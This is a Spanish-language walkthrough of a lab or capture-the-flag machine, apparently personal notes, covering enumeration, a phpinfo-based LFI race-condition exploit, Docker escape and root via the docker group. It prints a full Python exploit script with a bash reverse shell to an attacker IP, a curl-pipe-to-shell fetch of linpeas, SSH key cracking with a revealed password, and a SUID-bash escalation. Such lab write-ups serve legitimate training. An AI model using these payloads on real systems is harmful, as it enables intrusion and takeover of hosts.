----------
**IP:** 
**SO:** 
**Vulns:** 

------------------------------------------
Vamos primero a analizar la red en búsqueda de la maquina con ayuda de [[Arp-Scan]]:
```bash
arp-scan -I eth0 --localnet --ignoredups
```

![[Pasted image 20250830205829.png]]
Como podemos ver la IP de la maquina es `192.168.1.70`, con esto vamos a intentar realizar con ping un pequeño tanteo del sistema que tiene la maquina victima:
```bash
ping -c 1 192.168.1.70
```

![[Pasted image 20250830205957.png]]

Podemos ver que el `ttl=64` por lo que el sistema posiblemente es Linux.
Ahora vamos a realizar el escaneo de puerto con [[Nmap]]:
```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.70 -oG allports
```

![[Pasted image 20250830210957.png]]
Podemos observar que tenemos únicamente el puerto `80` abierto por lo que vamos a realizarle un escaneo mas a fondo:

```bash
nmap -p80 -sCV 192.168.1.70 -oN target
```
![[Pasted image 20250830211128.png]]

Perfecto, tenemos una web corriendo en el puerto 80, vamos a comenzar a ver que es lo que tiene primero con ayuda de whatweb para ver sus tecnologías:
```bash
whatweb http://192.168.1.70
```

![[Pasted image 20250830211307.png]]
Podemos observar la versión de php y la de apache pero no mucho mas por lo que vamos a visitar la web aver que encontramos:
![[Pasted image 20250830211449.png]]

vemos esa web, vamos a enumerar un poco y veamos que encontramos.

No encontramos nada en esta web por lo que vamos a realizar una enumeración para ver que recursos extras podemos encontrar en la web:
```bash
gobuster dir -u http://192.168.1.70 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

![[Pasted image 20250830215053.png]]
Vemos que tenemos un archivo `info.php` el cual tiene el siguiente contenido:
![[Pasted image 20250830220622.png]]
algo que podemos buscar aquí es si de alguna forma nosotros podemos incluir archivos en el sistema ya que si lo logramos solo tendríamos que buscar la forma de proceder con un [[Local File Inclusion (LFI)]] y cargar un archivo malicioso.
![[Pasted image 20250830220744.png]]

Vemos que si podemos subir archivos, por lo que vamos a hacer lo siguiente:

Primero interceptemos una petición normal por GET a la web de info.php y lo mandamos al repeater:
![[Pasted image 20250830220902.png]]
Ahora vamos a modificarla poco a poco para poder enviar archivos.

Primero cambiemos el método de GET a POST:
![[Pasted image 20250830220958.png]]
Ahora vamos a construir de la siguiente manera la estructura para el envío de un archivo, para tener una referencia de lo que tenemos que usar podemos buscar `content type boundary` y ya tendremos una referencia de la estructura principal:
![[Pasted image 20250830221824.png]]

Listo enviemos y revisemos la respuesta:
![[Pasted image 20250830221833.png]]
filtramos por test y veremos información y la  ruta donde se almaceno el archivo temporal que se subió.
Esto es una gran señal de que todo esta funcionando, el punto es encontrar una vulnerabilidad de tipo [[Local File Inclusion (LFI)]] para poder cargar estos archivo por lo que vamos a hacer lo siguiente ya que no tenemos mas alternativas.

Vamos a intentar con ayuda de [[Wfuzz]] hacer fuzz por algún parámetro en el `index.php` que es el archivo principal de la web y veamos si conseguimos algo:
```bash
wfuzz -c -t 200 --hl=136 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.1.70/index.php?FUZZ=/etc/passwd"
```

![[Pasted image 20250830222542.png]]

Vemos que logramos obtener un parámetro filename, veamos si es valido:
![[Pasted image 20250830222649.png]]

Podemos ver que efectivamente funciona, entonces vamos a crear un archivo maliciosos cmd.php en el sistema para ver si la web nos interpreta y podemos ejecutar comandos logrando un [[Log Poisoning (LFI - RCE)]] por lo que vamos primero a crear el archivo:
![[Pasted image 20250830222922.png]]
Entonces vamos a ver si se sube correctamente:
![[Pasted image 20250830222948.png]]

perfecto, ya tenemos subido el archivo y la ruta temporal.
![[Pasted image 20250830223303.png]]

no podemos ver nada y esto puede ser debido a que al ser un temporal se crea y al instante lo elimina por lo que a nosotros se nos viene a la mente una [[Condiciones de carrera (Race Condition)]] y en si si es eso lo que tenemos que hacer por lo que vamos a usar un script en python que nos permite romper esta vulnerabilidad y es el que se encuentra en la siguiente web https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html.

```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php system("bash -c 'bash -i>& /dev/tcp/192.168.1.110/443 0>&1'"); ?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

en el script modificamos cositas como el comando a ejecutar, la url y el match del file_name al cual debe aplicarse, ya con eso seguros de que se modifico correctamente vamos a intentar ver si con esto logramos obtener una reverse shell:

```bash
 python2.7 phpinfolfi.py 192.168.1.70 80
```

![[Pasted image 20250830224950.png]]

Logramos obtener una conexión y ya estamos dentro, por lo que vamos a hacer el tratamiento para hacer reconocimiento dentro de la maquina:
![[Pasted image 20250830225220.png]]
como vemos en la imagen anterior entramos a la maquina pero en realidad no era la maquina es un contenedor de algún tipo del cual vamos a tener que escapar.

Hemos intentado encontrar varias cosas pero no encontramos nada dentro del docker por lo cual nuestra mejor opción es usar una herramienta mas brusca de enumeración que va a ser el `linPEAS`:
```bash
curl -L http://192.168.1.110/linpeas.sh | sh
```

En mi caso la maquina no tenia internet por lo que descargue el recurso en mi maquina y levante un servidor.
![[Pasted image 20250830230248.png]]
Vemos en una parte de la información que tenemos algunos archivos ocultos en la raíz por lo que vamos a revisarlos:

![[Pasted image 20250830230414.png]]
En este caso que hice fue llevarme el archivo comprimido al directorio `/tmp` y cambiarle el nombre para que no este oculto.
Ahora vamos a descomprimirlo a ver que encontramos:
![[Pasted image 20250830230535.png]]

vemos que tenemos una clave privada y una publica al parecer de root.
![[Pasted image 20250830230626.png]]

Vemos que esta cifrada pero esto nos lo pasamos a nuestra maquina y la ponemos en un archivo ya que vamos a intentar romperla:
![[Pasted image 20250830230752.png]]
ahora vamos a utilizar una utilidad de John que es `ssh2john` que nos permite crear obtener el hash que vamos a intentar romper por fuerza bruta:
```bash
ssh2john id_rsa
```

![[Pasted image 20250830230940.png]]

Vamos a guardarlo en un archivo hash para ya poder usar john:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

![[Pasted image 20250830231700.png]]

Podemos observar que la password es `choclate93` ahora tenemos que saber que el puerto 22 en el docker no esta habilitado pero esto no quiere decir que en la maquina host tampoco lo este por lo que vamos a ver si en la maquina host lo esta, ahora la IP que nos da el docker es `192.168.150.21` por lo que la IP de la maquina Host tiene que ser la `192.168.150.1`:
```bash
echo '' > /dev/tcp/192.168.150.1/22 && echo $?
```

![[Pasted image 20250830232015.png]]
vemos que el código de estado es el `0` por lo que si esta abiertos vamos a conectarnos:

```bash
ssh -i root root@192.168.150.1
```

![[Pasted image 20250830232219.png]]

Podemos ver que no es valida la clave privada y por ende nos pide la clave de root pero del usuario root de sistema y esa no la tenemos.

Otra cosa es ver si podemos hacernos root en el contenedor con esa password:
![[Pasted image 20250830232418.png]]

En efecto en el contenedor lo logramos.

root también tiene una clave publica y privada(encriptada también) vemos la publica:
![[Pasted image 20250830232656.png]]
Podemos ver que la clave publica hace referencia a un usuario llamado admin.
Se suelen dar los casos que por confianza se podría decir algunos usuario que tiene pares de claves pueden conectarse sin proporcionar clave, intentemoslo:
```bash

```
![[Pasted image 20250830232918.png]]
vemos que en este caso si nos pide contraseña para la clave privada y podríamos intentar ver si se están reutilizando credenciales usando la de `choclate93`:
![[Pasted image 20250830233030.png]]

entonces ya salimos del contenedor y estamos en la maquina real, ahora vamos a intentar saltar al usuario root.

Este caso revisemos si no estamos en el grupo docker:
![[Pasted image 20250830233141.png]]

vemos que si estamos entonces ya tenemos una via potencial donde abusando de monturas pueda montar toda la raíz del sistema real en un contenedor para poder tener acceso.
Por lo tanto vamos a hacer lo siguiente:
![[Pasted image 20250830233403.png]]
ya con el contenedor creado vamos a ingresar en el:
![[Pasted image 20250830233506.png]]

ya dentro del mismo recordemos que lo montamos en `/mnt/root` vamos a ver si tenemos todo el contenido:
![[Pasted image 20250830233543.png]]

Efectivamente tenemos todo el sistema aquí por lo tanto los cambios que se hagan aquí los veremos también fuera por lo tanto vamos a asignar privilegios SUID a la bash y salgamos para ver si podemos ya ingresar:
![[Pasted image 20250830233855.png]]
vemos que los cambios se aplicaron y por lo tanto ya podemos hacernos root:
![[Pasted image 20250830233931.png]]

Maquina Terminada :)